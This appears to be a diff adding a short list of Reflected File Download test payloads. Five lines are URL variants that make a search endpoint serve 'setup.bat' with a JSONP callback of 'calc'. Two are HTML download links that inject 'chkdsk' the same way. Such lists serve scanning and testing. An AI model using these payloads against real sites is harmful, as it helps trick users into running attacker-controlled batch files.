@@ -1,0 +1,7 @@
+/search.bat?term=f00bar&callback=calc
+/search;setup.bat?term=f00bar&callback=calc
+/search/setup.bat?term=f00bar&callback=calc
+/search;/setup.bat?term=f00bar&callback=calc
+/search;/setup.bat;?term=f00bar&callback=calc
+/setup.bat?callback=chkdsk" download="setup.bat">Download</a>;
+<a href="https://www.example-site.pt/api/setup.json?callback=chkdsk" download="setup.bat">Download</a>;
